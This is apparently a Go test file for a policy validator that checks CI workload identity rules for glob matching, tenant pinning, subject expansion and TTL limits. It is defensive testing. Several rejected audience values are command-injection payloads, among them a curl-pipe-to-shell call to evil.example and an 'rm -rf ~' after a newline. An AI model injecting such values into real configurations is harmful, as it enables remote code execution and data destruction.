package policy

import (
	"os"
	"strings"
	"testing"
	"time"
)

func ghWorkloads() *Workloads {
	return &Workloads{
		Audience: "halos",
		Issuers:  []WorkloadIssuer{{Name: "github", URL: "https://token.actions.githubusercontent.com"}},
		Rules: []WorkloadRule{{
			Name: "release-bot", Issuer: "github",
			Match:   map[string]string{"repository": "acme/*", "ref": "refs/heads/main", "environment": "ai-*"},
			Subject: "workload:gh:{repository}", Groups: []string{"ci-agents"},
		}},
	}
}

func TestMatchWorkloadGlobs(t *testing.T) {
	w := ghWorkloads()
	base := func(kv ...string) map[string]any {
		c := map[string]any{"repository": "acme/app", "ref": "refs/heads/main", "environment": "ai-prod"}
		for i := 0; i+1 < len(kv); i += 2 {
			if kv[i+1] == "<nil>" {
				delete(c, kv[i])
				continue
			}
			c[kv[i]] = kv[i+1]
		}
		return c
	}
	for _, tc := range []struct {
		name   string
		issuer string
		claims map[string]any
		sub    string // "" = no match
	}{
		{"all match", "github", base(), "workload:gh:acme/app"},
		{"glob does not cross /", "github", base("repository", "acme/team/app"), ""},
		{"other owner", "github", base("repository", "evil/app"), ""},
		{"owner prefix is not a glob match", "github", base("repository", "acme-evil/app"), ""},
		{"branch mismatch", "github", base("ref", "refs/heads/feature"), ""},
		{"exact is exact", "github", base("ref", "refs/heads/main2"), ""},
		{"missing claim never matches", "github", base("environment", "<nil>"), ""},
		{"other issuer's tokens never match", "gitlab", base(), ""},
		{"non-string claim", "github", map[string]any{"repository": []any{"acme/app"}, "ref": "refs/heads/main", "environment": "ai-x"}, ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, sub, ok := w.MatchWorkload(tc.issuer, tc.claims)
			if ok != (tc.sub != "") || sub != tc.sub {
				t.Fatalf("got %q ok=%v, want %q", sub, ok, tc.sub)
			}
		})
	}
}

// A policy that never went through Validate (halo-server, a hand-built
// snapshot) still cannot admit another tenant: MatchWorkload skips rules that
// pin no tenant, and rules naming no declared issuer.
func TestMatchWorkloadSkipsUnpinnedRules(t *testing.T) {
	w := ghWorkloads()
	w.Rules = []WorkloadRule{
		{Name: "any-main", Issuer: "github", Match: map[string]string{"ref": "refs/heads/main"}, Subject: "workload:gh:{repository}"},
		{Name: "owner-glob", Issuer: "github", Match: map[string]string{"repository_owner": "acme*"}, Subject: "workload:gh:{repository}"},
		{Name: "ghost-issuer", Issuer: "nope", Match: map[string]string{"repository_owner": "acme"}, Subject: "workload:gh:{repository}"},
		{Name: "pinned", Issuer: "github", Match: map[string]string{"repository_owner": "acme", "ref": "refs/heads/main"}, Subject: "workload:gh:{repository}"},
	}
	if got := strings.Join(w.UnpinnedRules(), ","); got != "any-main,owner-glob,ghost-issuer" {
		t.Fatalf("UnpinnedRules = %s", got)
	}
	evil := map[string]any{"repository_owner": "acme-evil", "repository": "acme-evil/x", "ref": "refs/heads/main"}
	if r, sub, ok := w.MatchWorkload("github", evil); ok {
		t.Fatalf("another tenant's job matched rule %s as %s", r.Name, sub)
	}
	r, sub, ok := w.MatchWorkload("github", map[string]any{"repository_owner": "acme", "repository": "acme/app", "ref": "refs/heads/main"})
	if !ok || r.Name != "pinned" || sub != "workload:gh:acme/app" {
		t.Fatalf("pinned rule: %s %q %v", r.Name, sub, ok)
	}
}

// A known issuer's tenantClaim that is not one of its tenant claims (GitHub
// plus tenantClaim: ref) cannot make "ref: refs/heads/main" a tenant pin:
// that rule would mint for every repository on GitHub. MatchWorkload and
// Validate (hence SecurityIssues) both ignore the bogus tenantClaim.
func TestKnownIssuerIgnoresForeignTenantClaim(t *testing.T) {
	// "repository" is a real tenant claim, but the rule does not match it.
	for _, claim := range []string{"ref", "environment", "sub", "repository"} {
		t.Run(claim, func(t *testing.T) {
			w := ghWorkloads()
			w.Issuers[0].TenantClaim = claim
			w.Rules = []WorkloadRule{{Name: "main", Issuer: "github", Match: map[string]string{"ref": "refs/heads/main", "sub": "*", "environment": "prod"}, Subject: "workload:gh:{repository}"}}
			evil := map[string]any{"repository_owner": "evil", "repository": "evil/x", "ref": "refs/heads/main", "sub": "repo:evil/x", "environment": "prod"}
			if r, sub, ok := w.MatchWorkload("github", evil); ok {
				t.Fatalf("tenantClaim %s: another tenant's job matched rule %s as %s", claim, r.Name, sub)
			}
			if got := strings.Join(w.UnpinnedRules(), ","); got != "main" {
				t.Fatalf("UnpinnedRules = %q, want main", got)
			}
			o := &Org{Workloads: w}
			sec := SecurityIssues(o)
			if !hasIssue(sec, "workloads.rules[0].match", "pins no tenant") {
				t.Fatalf("SecurityIssues does not refuse the rule: %v", sec)
			}
		})
	}
	// A real tenant claim still narrows: repository_owner pinned is enough.
	w := ghWorkloads()
	w.Issuers[0].TenantClaim = "repository_owner"
	w.Rules = []WorkloadRule{{Name: "owner", Issuer: "github", Match: map[string]string{"repository_owner": "acme"}, Subject: "workload:gh:{repository}"}}
	if _, _, ok := w.MatchWorkload("github", map[string]any{"repository_owner": "acme", "repository": "acme/app"}); !ok {
		t.Fatal("rule pinned by the issuer's narrowed tenant claim did not match")
	}
}

func hasIssue(iss []Issue, path, msg string) bool {
	for _, i := range iss {
		if i.Path == path && strings.Contains(i.Message, msg) {
			return true
		}
	}
	return false
}

func TestWorkloadSubjectExpansion(t *testing.T) {
	r := WorkloadRule{Name: "r", Issuer: "i", Match: map[string]string{"sub": "x"}}
	for _, tc := range []struct {
		subject string
		claims  map[string]any
		want    string
	}{
		{"workload:{sub}", map[string]any{"sub": "x"}, "workload:x"},
		{"workload:{a}:{b}", map[string]any{"sub": "x", "a": "1", "b": true}, "workload:1:true"},
		{"workload:{missing}", map[string]any{"sub": "x"}, ""},
		{"workload:{a}", map[string]any{"sub": "x", "a": "{sub}"}, ""}, // no nested expansion
		{"workload:{a}", map[string]any{"sub": "x", "a": ""}, ""},
		{"{a}", map[string]any{"sub": "x", "a": "workload:y"}, "workload:y"},
		{"{a}", map[string]any{"sub": "x", "a": "alice@acme.com"}, ""}, // never a human id
		{"workload:{a", map[string]any{"sub": "x", "a": "1"}, ""},
	} {
		r.Subject = tc.subject
		got, ok := r.expandSubject(tc.claims)
		if ok != (tc.want != "") || (ok && got != tc.want) {
			t.Errorf("%s with %v: got %q ok=%v, want %q", tc.subject, tc.claims, got, ok, tc.want)
		}
	}
}

func TestWorkloadTTL(t *testing.T) {
	for in, want := range map[int]time.Duration{0: 15 * time.Minute, 60: time.Minute, 3600: time.Hour, 99999: time.Hour} {
		if got := (WorkloadRule{MaxTTLSeconds: in}).TTL(); got != want {
			t.Errorf("TTL(%d)=%s want %s", in, got, want)
		}
	}
}

func TestValidateWorkloads(t *testing.T) {
	for _, tc := range []struct {
		name string
		mod  func(*Workloads)
		want string // substring of an error path+message; "" = no workloads error
	}{
		{"valid", func(*Workloads) {}, ""},
		{"loopback http issuer ok", func(w *Workloads) { w.Issuers[0].URL, w.Issuers[0].TenantClaim = "http://127.0.0.1:8080", "repository" }, ""},
		{"no audience", func(w *Workloads) { w.Audience = "" }, "workloads.audience"},
		{"url audience ok", func(w *Workloads) { w.Audience = "https://halo.acme.example/ci" }, ""},
		{"audience semicolon", func(w *Workloads) { w.Audience = "halos; curl evil.example | sh" }, "workloads.audience"},
		{"audience command substitution", func(w *Workloads) { w.Audience = "$(id)" }, "workloads.audience"},
		{"audience backtick", func(w *Workloads) { w.Audience = "`id`" }, "workloads.audience"},
		{"audience newline", func(w *Workloads) { w.Audience = "halos\nrm -rf ~" }, "workloads.audience"},
		{"audience yaml break", func(w *Workloads) { w.Audience = "halos\"\n        run: id #" }, "workloads.audience"},
		{"audience quote", func(w *Workloads) { w.Audience = `halos"x` }, "workloads.audience"},
		{"audience too long", func(w *Workloads) { w.Audience = strings.Repeat("a", 129) }, "workloads.audience"},
		{"issuer audience injection", func(w *Workloads) { w.Issuers[0].Audience = "x;id" }, "workloads.issuers[0].audience"},
		{"http issuer", func(w *Workloads) { w.Issuers[0].URL = "http://token.actions.githubusercontent.com" }, "workloads.issuers[0].url"},
		{"duplicate issuer", func(w *Workloads) { w.Issuers = append(w.Issuers, w.Issuers[0]) }, "workloads.issuers[1]"},
		{"unknown issuer", func(w *Workloads) { w.Rules[0].Issuer = "gitlab" }, "workloads.rules[0].issuer"},
		{"no match", func(w *Workloads) { w.Rules[0].Match = nil }, "workloads.rules[0].match"},
		{"only wildcards", func(w *Workloads) { w.Rules[0].Match = map[string]string{"repository": "*/*", "ref": "*"} }, "workloads.rules[0].match"},
		{"bad glob", func(w *Workloads) { w.Rules[0].Match["ref"] = "refs/[" }, "workloads.rules[0].match.ref"},
		{"human subject", func(w *Workloads) { w.Rules[0].Subject = "alice@acme.com" }, "workloads.rules[0].subject"},
		{"bare prefix subject", func(w *Workloads) { w.Rules[0].Subject = "workload:" }, "workloads.rules[0].subject"},
		{"unbalanced subject", func(w *Workloads) { w.Rules[0].Subject = "workload:{repository" }, "workloads.rules[0].subject"},
		{"ttl over an hour", func(w *Workloads) { w.Rules[0].MaxTTLSeconds = 3601 }, "workloads.rules[0].maxTTLSeconds"},
		{"duplicate rule", func(w *Workloads) { w.Rules = append(w.Rules, w.Rules[0]) }, "workloads.rules[1].name"},
		// Tenant pinning: a public issuer signs for every tenant, with any aud.
		{"ref alone pins no tenant", func(w *Workloads) { w.Rules[0].Match = map[string]string{"ref": "refs/heads/main"} }, "workloads.rules[0].match: pins no tenant"},
		{"owner prefix glob admits acme-evil", func(w *Workloads) { w.Rules[0].Match = map[string]string{"repository_owner": "acme*"} }, "workloads.rules[0].match: pins no tenant"},
		{"repository */app", func(w *Workloads) { w.Rules[0].Match = map[string]string{"repository": "*/app"} }, "workloads.rules[0].match: pins no tenant"},
		{"repository acme-*/app", func(w *Workloads) { w.Rules[0].Match = map[string]string{"repository": "acme-*/app"} }, "workloads.rules[0].match: pins no tenant"},
		{"non-tenant claim pinned exactly", func(w *Workloads) {
			w.Rules[0].Match = map[string]string{"job_workflow_ref": "acme/x/.github/workflows/a.yml@refs/heads/main"}
		}, "workloads.rules[0].match: pins no tenant"},
		{"owner exact", func(w *Workloads) { w.Rules[0].Match = map[string]string{"repository_owner": "acme"} }, ""},
		{"owner id exact", func(w *Workloads) { w.Rules[0].Match = map[string]string{"repository_owner_id": "42", "ref": "*"} }, ""},
		{"github enterprise issuer is still github", func(w *Workloads) {
			w.Issuers[0].URL = "https://token.actions.githubusercontent.com/acme-ent"
			w.Rules[0].Match = map[string]string{"ref": "refs/heads/main"}
		}, "workloads.rules[0].match: pins no tenant"},
		{"tenantClaim narrows a known issuer", func(w *Workloads) { w.Issuers[0].TenantClaim = "repository_owner_id" }, "workloads.rules[0].match: pins no tenant"},
		{"tenantClaim on a known issuer must be a tenant claim", func(w *Workloads) { w.Issuers[0].TenantClaim = "ref" }, "workloads.issuers[0].tenantClaim"},
		{"unknown issuer needs tenantClaim", func(w *Workloads) { w.Issuers[0].URL = "https://ci.acme.example" }, "workloads.issuers[0].tenantClaim: required"},
		{"lookalike host is unknown", func(w *Workloads) { w.Issuers[0].URL = "https://token.actions.githubusercontent.com.evil.example" }, "workloads.issuers[0].tenantClaim: required"},
		{"unknown issuer: rule must pin its tenantClaim", func(w *Workloads) {
			w.Issuers[0].URL, w.Issuers[0].TenantClaim = "https://ci.acme.example", "org"
		}, "workloads.rules[0].match: pins no tenant"},
		{"unknown issuer pinned", func(w *Workloads) {
			w.Issuers[0].URL, w.Issuers[0].TenantClaim = "https://ci.acme.example", "org"
			w.Rules[0].Match["org"] = "acme"
		}, ""},
		{"gitlab group/*", func(w *Workloads) {
			w.Issuers[0].URL = "https://gitlab.com"
			w.Rules[0].Match = map[string]string{"namespace_path": "acme/*"}
		}, ""},
		{"gitlab ref only", func(w *Workloads) {
			w.Issuers[0].URL = "https://gitlab.com"
			w.Rules[0].Match = map[string]string{"ref_protected": "true"}
		}, "workloads.rules[0].match: pins no tenant"},
		{"buildkite pipeline only", func(w *Workloads) {
			w.Issuers[0].URL = "https://agent.buildkite.com"
			w.Rules[0].Match = map[string]string{"pipeline_slug": "monorepo"}
		}, "workloads.rules[0].match: pins no tenant"},
		{"circleci org id", func(w *Workloads) {
			w.Issuers[0].URL = "https://oidc.circleci.com/org/6f6d0c1a"
			w.Rules[0].Match = map[string]string{"oidc.circleci.com/org-id": "6f6d0c1a"}
		}, ""},
		{"google any service account", func(w *Workloads) {
			w.Issuers[0].URL = "https://accounts.google.com"
			w.Rules[0].Match = map[string]string{"email": "*@acme-prod.iam.gserviceaccount.com"}
		}, "workloads.rules[0].match: pins no tenant"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			w := ghWorkloads()
			tc.mod(w)
			v := &validator{org: &Org{Workloads: w}}
			v.workloads()
			var got []string
			for _, i := range v.issues {
				if i.Severity == SeverityError {
					got = append(got, i.Path+": "+i.Message)
				}
			}
			all := strings.Join(got, "\n")
			if tc.want == "" && len(got) > 0 || tc.want != "" && !strings.Contains(all, tc.want) {
				t.Fatalf("want %q, got:\n%s", tc.want, all)
			}
		})
	}
}

// GitHub rules that pin only renamable names, or that any workflow (including
// pull_request_target on the base branch) can satisfy, validate with a warning.
func TestValidateWorkloadsGitHubWarnings(t *testing.T) {
	for _, tc := range []struct {
		name  string
		match map[string]string
		want  []string // substrings of the warnings, in order
	}{
		{"name only, no environment", map[string]string{"repository": "acme/app"}, []string{"renamed", "pull_request_target"}},
		{"owner id and environment", map[string]string{"repository_owner_id": "42", "environment": "prod"}, nil},
		{"repo id and pinned workflow", map[string]string{"repository_id": "7", "job_workflow_ref": "acme/p/.github/workflows/a.yml@refs/heads/main"}, nil},
		{"owner name and environment", map[string]string{"repository_owner": "acme", "environment": "prod"}, []string{"renamed"}},
		{"buildkite slug only", map[string]string{"organization_slug": "acme"}, []string{"organization_id"}},
		{"buildkite org id", map[string]string{"organization_id": "0190b0b4", "organization_slug": "acme"}, nil},
		{"gitlab path only", map[string]string{"namespace_path": "acme"}, []string{"namespace_id or project_id"}},
		{"gitlab project id", map[string]string{"project_id": "7", "namespace_path": "acme"}, nil},
	} {
		t.Run(tc.name, func(t *testing.T) {
			w := ghWorkloads()
			w.Rules[0].Match = tc.match
			if strings.HasPrefix(tc.name, "buildkite") {
				w.Issuers[0].URL = "https://agent.buildkite.com"
			} else if strings.HasPrefix(tc.name, "gitlab") {
				w.Issuers[0].URL = "https://gitlab.com"
			}
			v := &validator{org: &Org{Workloads: w}}
			v.workloads()
			var got []string
			for _, i := range v.issues {
				if i.Severity == SeverityError {
					t.Fatalf("unexpected error %s", i)
				}
				got = append(got, i.Message)
			}
			if len(got) != len(tc.want) {
				t.Fatalf("warnings %q, want %q", got, tc.want)
			}
			for i, w := range tc.want {
				if !strings.Contains(got[i], w) {
					t.Errorf("warning %q lacks %q", got[i], w)
				}
			}
		})
	}
}

func TestSchemaWorkloads(t *testing.T) {
	s := compileSchemas(t)["halos.schema.json"]
	good := "kind: Halos\norg: acme\nworkloads:\n  audience: halos\n  issuers:\n    - {name: github, url: https://token.actions.githubusercontent.com}\n" +
		"  rules:\n    - name: ci\n      issuer: github\n      match: {repository_owner: acme}\n      subject: workload:gh:{repository}\n      groups: [ci-agents]\n      maxTTLSeconds: 900\n"
	if err := s.Validate(yamlDocs(t, []byte(good))[0]); err != nil {
		t.Fatalf("valid workloads rejected: %v", err)
	}
	for name, bad := range map[string]string{
		"unknown field":   strings.Replace(good, "groups: [ci-agents]", "bogus: 1", 1),
		"human subject":   strings.Replace(good, "workload:gh:{repository}", "alice@acme.com", 1),
		"ttl over 1h":     strings.Replace(good, "maxTTLSeconds: 900", "maxTTLSeconds: 7200", 1),
		"no match":        strings.Replace(good, "      match: {repository_owner: acme}\n", "", 1),
		"missing issuers": strings.Replace(good, "  issuers:\n    - {name: github, url: https://token.actions.githubusercontent.com}\n", "", 1),
	} {
		if err := s.Validate(yamlDocs(t, []byte(bad))[0]); err == nil {
			t.Errorf("%s: schema accepted it", name)
		}
	}
}

// examples/ci-agents (also loaded by TestExamplesValidate) stays schema-valid
// and its rules match the providers' documented claims.
func TestCIAgentsExampleWorkloads(t *testing.T) {
	b, err := os.ReadFile("../../examples/ci-agents/halos.yaml")
	if err != nil {
		t.Fatal(err)
	}
	if err := compileSchemas(t)["halos.schema.json"].Validate(yamlDocs(t, b)[0]); err != nil {
		t.Fatalf("schema: %v", err)
	}
	org, err := Load("../../examples/ci-agents")
	if err != nil {
		t.Fatal(err)
	}
	if issues := org.Validate(); HasErrors(issues) || len(org.Workloads.Rules) < 4 {
		t.Fatalf("issues %v", issues)
	}
	_, sub, ok := org.Workloads.MatchWorkload("gitlab", map[string]any{"namespace_id": "4242", "namespace_path": "acme", "ref_protected": "true", "project_path": "acme/api"})
	if !ok || sub != "workload:gl:acme/api" {
		t.Fatalf("gitlab rule: %q %v", sub, ok)
	}
}

// The root document's workloads reach the loaded Org.
func TestLoadWorkloads(t *testing.T) {
	dir := writeRepo(t, map[string]string{RootFile: "org: acme\nworkloads:\n  audience: halos\n  issuers: [{name: gl, url: https://gitlab.com}]\n" +
		"  rules: [{name: r, issuer: gl, match: {namespace_path: acme}, subject: 'workload:gl:{project_path}'}]\n"})
	org, err := Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	if org.Workloads == nil || org.Workloads.Rules[0].Subject != "workload:gl:{project_path}" || org.Workloads.AllowsExperiments() {
		t.Fatalf("workloads not loaded: %+v", org.Workloads)
	}
}
